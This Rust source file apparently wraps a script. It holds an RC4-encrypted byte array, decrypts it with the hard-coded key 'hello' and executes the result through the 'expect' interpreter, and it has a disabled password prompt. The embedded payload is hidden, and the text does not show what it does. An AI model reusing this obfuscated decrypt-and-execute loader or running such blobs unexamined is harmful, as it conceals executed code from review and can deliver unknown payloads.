
use std::io;
use std::iter::repeat;
use std::io::Write;
use std::process;
use std::process::{Command, Stdio};
use std::env;

#[derive(Copy)]
pub struct Arc4 {
    i: u8,
    j: u8,
    state: [u8; 256],
}

impl Clone for Arc4 {
    fn clone(&self) -> Arc4 {
        *self
    }
}

impl Arc4 {
    pub fn new(key: &[u8]) -> Arc4 {
        assert!(key.len() >= 1 && key.len() <= 256);
        let mut rc4 = Arc4 {
            i: 0,
            j: 0,
            state: [0; 256],
        };
        for (i, x) in rc4.state.iter_mut().enumerate() {
            *x = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256 {
            j = j
                .wrapping_add(rc4.state[i])
                .wrapping_add(key[i % key.len()]);
            rc4.state.swap(i, j as usize);
        }
        rc4
    }
    fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.state[self.i as usize]);
        self.state.swap(self.i as usize, self.j as usize);
        let k = self.state
            [(self.state[self.i as usize].wrapping_add(self.state[self.j as usize])) as usize];
        k
    }

    fn encode_vec(&mut self, input: &[u8], output: &mut [u8]) {
        assert!(input.len() == output.len());
        for (x, y) in input.iter().zip(output.iter_mut()) {
            *y = *x ^ self.next();
        }
    }

    pub fn trans_vec(&mut self, input: &Vec<u8>) -> Vec<u8> {
        let mut out: Vec<u8> = repeat(0).take(input.len()).collect();
        self.encode_vec(input, &mut out);
        return out.to_vec();
    }

    pub fn trans_str(&mut self, str: &String) -> Vec<u8> {
        return self.trans_vec(&str.as_bytes().to_vec());
    }
}

fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
    let prog = format!("{}", prog.to_owned());
    //println!("{}", prog);
    let opt = if iterp == "ruby" { "-e" } else { "-c" };
    let output = Command::new(iterp)
        .arg(opt)
        .arg(prog)
        .args(args)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute process");
    //println!("status: {}", output.status.code().unwrap());
    std::process::exit(output.status.code().unwrap());
}

fn main() {
    let prog = vec![124, 33, 222, 141, 197, 136, 170, 119, 53, 174, 141, 124, 161, 246, 144, 63, 32, 134, 28, 126, 177, 230, 95, 64, 58, 134, 239, 246, 189, 162, 251, 214, 119, 110, 146, 68, 177, 31, 21, 209, 36, 222, 176, 107, 239, 93, 145, 219, 187, 158, 18, 81, 140, 64, 186, 89, 91, 42, 202, 22, 156, 140, 76, 212, 13, 132, 88, 96, 209, 223, 69, 36, 222, 82, 138, 138, 97, 194, 100, 240, 235, 174, 94, 62, 224, 109, 87, 152, 225, 161, 218, 188, 254, 49, 71, 204, 220, 103, 33, 236, 2, 174, 211, 22, 64, 103, 102, 121, 225, 80, 238, 158, 229, 234, 101, 156, 200, 115, 122, 4, 232, 85, 29];
    let pass = "";
    let iterp = "expect";

    if pass.len() != 0 {
        let mut input = String::new();
        print!("Password: ");
        io::stdout().flush().ok();
        io::stdin()
            .read_line(&mut input)
            .ok()
            .expect("Couldn't read password");
        if input.trim() != pass {
            println!("Invalid password!");
            process::exit(1);
        }
    }
    let prog_vec = Arc4::new(b"hello").trans_vec(&prog);
    let prog_str = String::from_utf8(prog_vec).unwrap();
    //println!("running ...:\n {}", prog_str);
    let mut args = env::args().collect::<Vec<_>>();
    args.drain(0..1);
    run_process(&iterp.to_string(), &prog_str, &args);
}
